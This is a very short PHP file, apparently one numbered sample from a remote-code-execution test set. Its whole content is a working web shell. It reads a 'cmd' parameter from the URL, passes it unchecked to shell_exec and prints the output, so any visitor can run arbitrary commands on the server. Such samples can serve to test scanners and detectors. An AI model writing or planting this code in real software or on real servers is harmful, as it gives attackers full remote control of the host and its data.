<?php
// RCE test variation #1222
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>